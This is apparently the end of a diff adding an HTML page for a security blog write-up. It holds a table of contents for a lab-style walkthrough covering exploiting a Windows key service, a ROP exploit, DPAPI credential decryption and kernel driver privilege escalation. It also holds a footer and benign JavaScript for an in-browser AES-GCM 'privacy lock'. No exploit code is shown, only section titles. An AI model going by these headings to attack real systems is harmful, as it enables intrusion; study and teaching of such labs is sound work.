dev_keys.txt</a></li><li class="toc-h3"><a href="#port-4141-network-service-interaction" class="toc-link" data-slug="port-4141-network-service-interaction">Port 4141 Network Service Interaction</a></li><li class="toc-h2"><a href="#reverse-engineering-dev-keysvc-exe" class="toc-link" data-slug="reverse-engineering-dev-keysvc-exe">Reverse Engineering - dev_keysvc.exe</a></li><li class="toc-h3"><a href="#initial-binary-reconnaissance-amp-mitigation-auditing" class="toc-link" data-slug="initial-binary-reconnaissance-amp-mitigation-auditing">Initial Binary Reconnaissance &amp;amp; Mitigation Auditing</a></li><li class="toc-h3"><a href="#ghidra-decompilation-key-validation-routine" class="toc-link" data-slug="ghidra-decompilation-key-validation-routine">Ghidra Decompilation - Key Validation Routine</a></li><li class="toc-h3"><a href="#algorithmic-verification-in-python" class="toc-link" data-slug="algorithmic-verification-in-python">Algorithmic Verification in Python</a></li><li class="toc-h3"><a href="#discovering-vulnerability-1-format-string-bug-cwe-134" class="toc-link" data-slug="discovering-vulnerability-1-format-string-bug-cwe-134">Discovering Vulnerability 1: Format String Bug (CWE-134)</a></li><li class="toc-h3"><a href="#discovering-vulnerability-2-stack-based-buffer-overflow-cwe-121" class="toc-link" data-slug="discovering-vulnerability-2-stack-based-buffer-overflow-cwe-121">Discovering Vulnerability 2: Stack-Based Buffer Overflow (CWE-121)</a></li><li class="toc-h2"><a href="#foothold-shell-as-keysvc" class="toc-link" data-slug="foothold-shell-as-keysvc">Foothold - Shell as keysvc</a></li><li class="toc-h3"><a href="#attack-architecture-amp-mitigation-strategy" class="toc-link" data-slug="attack-architecture-amp-mitigation-strategy">Attack Architecture &amp;amp; Mitigation Strategy</a></li><li class="toc-h3"><a href="#windows-x64-calling-convention-amp-rop-gadget-assembly" class="toc-link" data-slug="windows-x64-calling-convention-amp-rop-gadget-assembly">Windows x64 Calling Convention &amp;amp; ROP Gadget Assembly</a></li><li class="toc-h3"><a href="#complete-python-weaponization-exploit" class="toc-link" data-slug="complete-python-weaponization-exploit">Complete Python Weaponization Exploit</a></li><li class="toc-h3"><a href="#executing-the-exploit-amp-catching-the-shell" class="toc-link" data-slug="executing-the-exploit-amp-catching-the-shell">Executing the Exploit &amp;amp; Catching the Shell</a></li><li class="toc-h2"><a href="#lateral-movement-dpapi-credential-decryption" class="toc-link" data-slug="lateral-movement-dpapi-credential-decryption">Lateral Movement - DPAPI Credential Decryption</a></li><li class="toc-h3"><a href="#identifying-the-encrypted-automation-blob" class="toc-link" data-slug="identifying-the-encrypted-automation-blob">Identifying the Encrypted Automation Blob</a></li><li class="toc-h3"><a href="#in-session-decryption-via-net-reflection" class="toc-link" data-slug="in-session-decryption-via-net-reflection">In-Session Decryption via .NET Reflection</a></li><li class="toc-h3"><a href="#establishing-graphical-access-via-rdp" class="toc-link" data-slug="establishing-graphical-access-via-rdp">Establishing Graphical Access via RDP</a></li><li class="toc-h2"><a href="#privilege-escalation-kernel-exploitation-reaper-sys" class="toc-link" data-slug="privilege-escalation-kernel-exploitation-reaper-sys">Privilege Escalation - Kernel Exploitation (reaper.sys)</a></li><li class="toc-h3"><a href="#auditing-installed-third-party-drivers" class="toc-link" data-slug="auditing-installed-third-party-drivers">Auditing Installed Third-Party Drivers</a></li><li class="toc-h3"><a href="#exfiltrating-reaper-sys-for-offline-analysis" class="toc-link" data-slug="exfiltrating-reaper-sys-for-offline-analysis">Exfiltrating reaper.sys for Offline Analysis</a></li><li class="toc-h3"><a href="#static-reverse-engineering-of-reaper-sys" class="toc-link" data-slug="static-reverse-engineering-of-reaper-sys">Static Reverse Engineering of reaper.sys</a></li><li class="toc-h3"><a href="#privilege-escalation-strategy-kernel-token-stealing" class="toc-link" data-slug="privilege-escalation-strategy-kernel-token-stealing">Privilege Escalation Strategy - Kernel Token Stealing</a></li><li class="toc-h3"><a href="#developing-the-c-exploit-harness-priv-c" class="toc-link" data-slug="developing-the-c-exploit-harness-priv-c">Developing the C Exploit Harness (priv.c)</a></li><li class="toc-h3"><a href="#compilation-amp-exploitation-execution" class="toc-link" data-slug="compilation-amp-exploitation-execution">Compilation &amp;amp; Exploitation Execution</a></li><li class="toc-h2"><a href="#defensive-engineering-amp-remediation-blueprint" class="toc-link" data-slug="defensive-engineering-amp-remediation-blueprint">Defensive Engineering &amp;amp; Remediation Blueprint</a></li><li class="toc-h2"><a href="#credentials-summary" class="toc-link" data-slug="credentials-summary">Credentials Summary</a></li>
+        </ul>
+      </aside>
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+      <span>uziii2208 © 2026 - Build with no brain actual:D</span>
+      <span>
+        <a href="https://github.com/uziii2208" target="_blank" rel="noopener noreferrer">github</a>
+        &nbsp;·&nbsp;
+        <a href="https://pypi.org/user/uziii2208/" target="_blank" rel="noopener noreferrer">pypi</a>
+        &nbsp;·&nbsp;
+        <a href="https://0pwn0.github.io" target="_blank" rel="noopener noreferrer">0pwn0 archive ↗</a>
+      </span>
+    </div>
+  </footer>
+</div>
+
+<!-- ─── FLOATING BACK TO TOP ─── -->
+<button id="back-to-top" class="back-to-top-btn" onclick="scrollToTop()" title="Back to top">▲</button>
+
+<!-- ─── IMAGE LIGHTBOX MODAL ─── -->
+<div id="image-lightbox" class="lightbox-overlay" onclick="closeLightbox()">
+  <div class="lightbox-container" onclick="event.stopPropagation()">
+    <img id="lightbox-img" src="" alt="Proof of concept">
+    <button class="lightbox-close" onclick="closeLightbox()">✕</button>
+    <div id="lightbox-caption" class="lightbox-caption"></div>
+  </div>
+</div>
+
+<!-- ─── COMMAND PALETTE HUD (Ctrl+K or /) ─── -->
+<div id="cmd-palette" class="cmd-overlay" onclick="closeCmdPalette()">
+  <div class="cmd-dialog" onclick="event.stopPropagation()">
+    <div class="cmd-header">
+      <span class="cmd-prompt">&gt;</span>
+      <input type="text" id="cmd-input" placeholder="Quick search write-ups, tags, CVEs..." autocomplete="off" spellcheck="false">
+      <span class="cmd-badge">ESC to close</span>
+    </div>
+    <div class="cmd-results" id="cmd-results">
+      <!-- Search results generated by app.js -->
+    </div>
+  </div>
+</div>
+
+<!-- ─── TOAST NOTIFICATION ─── -->
+<div id="toast">
+  <svg class="ui-icon toast-svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+  <span id="toast-text"></span>
+</div>
+
+
+<script>
+
+(function() {
+  'use strict';
+  let privacyContainer = null;
+
+  window.togglePrivacyLock = async function() {
+    const contentEl = document.getElementById('post-view-content');
+    if (!contentEl) return;
+
+    const pass = prompt('Enter a temporary passkey to encrypt this post view (AES-256-GCM):');
+    if (!pass || !pass.trim()) return;
+
+    try {
+      const originalHTML = contentEl.innerHTML;
+      const tocSidebar = document.getElementById('post-toc-sidebar');
+
+      const salt = crypto.getRandomValues(new Uint8Array(16));
+      const iv = crypto.getRandomValues(new Uint8Array(12));
+      const enc = new TextEncoder();
+      const keyMaterial = await crypto.subtle.importKey('raw', enc.encode(pass), { name: 'PBKDF2' }, false, ['deriveKey']);
+      const aesKey = await crypto.subtle.deriveKey(
+        { name: 'PBKDF2', salt, iterations: 100000, hash: 'SHA-256' },
+        keyMaterial,
+        { name: 'AES-GCM', length: 256 },
+        false,
+        ['encrypt', 'decrypt']
+      );
+      const ciphertext = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, aesKey, enc.encode(originalHTML));
+
+      privacyContainer = {
+        salt,
+        iv,
+        ciphertext
+      };
+
+      if (tocSidebar) tocSidebar.style.display = 'none';
+
+      contentEl.innerHTML = `
+        <div class="locked-gate-wrap" id="privacy-gate">
+          <div class="locked-gate-card">
+            <div class="locked-gate-header">
+              <div class="locked-gate-icon-pulse">
+                <svg class="lock-svg" width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+              </div>
+              <div class="locked-gate-eyebrow">// PRIVACY SHIELD ACTIVE</div>
+              <h2 class="locked-gate-title">VIEWPORT ENCRYPTED</h2>
+              <p class="locked-gate-desc">
+                This document is encrypted in browser memory with <strong>AES-256-GCM</strong>. Enter your passkey to restore the viewport.
+              </p>
+            </div>
+            <form id="privacy-auth-form" class="locked-auth-form" onsubmit="return handlePrivacyUnlock(event)" autocomplete="off">
+              <div class="locked-input-group">
+                <span class="locked-prompt-symbol">KEY &gt;</span>
+                <input type="password" id="privacy-pass-input" class="locked-pass-input" placeholder="Enter your passkey..." autocomplete="off" required>
+              </div>
+              <div class="locked-actions-row">
+                <button type="submit" id="privacy-unlock-btn" class="locked-submit-btn">
+                  <span class="btn-text">DECRYPT &amp; RESTORE</span>
+                  <svg class="btn-arrow" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+                </button>
+              </div>
+              <div id="privacy-feedback" class="locked-feedback feedback-error" style="display:none;"></div>
+            </form>
+            <div class="locked-footer-notice">
+              <span>// PRIVACY LOCK: Decryption key is validated via 128-bit AES-GCM MAC tag in browser memory.</span>
+            </div>
+          </div>
+        </div>
+      `;
+
+      window.scrollTo({ top: contentEl.offsetTop - 80, behavior: 'smooth' });
+      if (typeof showToast === 'function') {
+        showToast('POST ENCRYPTED // VIEWPORT CONCEALED');
+      }
+    } catch (err) {
+      alert('Encryption failed: ' + err.message);
+    }
+  };
+
+  window.handlePrivacyUnlock = async function(e) {
+    e.preventDefault();
+    const input = document.getElementById('privacy-pass-input');
+    const feedback = document.getElementById('privacy-feedback');
+    const contentEl = document.getElementById('post-view-content');
+    if (!input || !privacyContainer || !contentEl) return false;
+
+    const pass = input.value;
+    input.value = '';
+
+    try {
+      const { salt, iv, ciphertext } = privacyContainer;
+      const enc = new TextEncoder();
+      const keyMaterial = await crypto.subtle.importKey('raw', enc.encode(pass), { name: 'PBKDF2' }, false, ['deriveKey']);
+      const aesKey = await crypto.subtle.deriveKey(
+        { name: 'PBKDF2', salt, iterations: 100000, hash: 'SHA-256' },
+        keyMaterial,
+        { name: 'AES-GCM', length: 256 },
+        false,
+        ['decrypt']
+      );
+      const decrypted = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, aesKey, ciphertext);
+      const dec = new TextDecoder();
+      const restoredHTML = dec.decode(decrypted);
+
+      contentEl.innerHTML = restoredHTML;
+      privacyContainer = null;
+
+      const tocSidebar = document.getElementById('post-toc-sidebar');
+      if (tocSidebar) tocSidebar.style.display = '';
+
+      if (typeof processCodeBlocks === 'function') {
+        try { processCodeBlocks(contentEl); } catch (err) {}
+      }
+      if (typeof initImageLightbox === 'function') {
+        try { initImageLightbox(); } catch (err) {}
+      }
+      if (typeof showToast === 'function') {
+        showToast('ACCESS GRANTED // VIEWPORT RESTORED');
+      }
+    } catch (err) {
+      if (feedback) {
+        feedback.textContent = '[AUTHENTICATION FAILED] Invalid passkey. Decryption denied.';
+        feedback.style.display = 'block';
+      }
+    }
+    return false;
+  };
+})();
+
+</script>
+
+</body>
+</html>
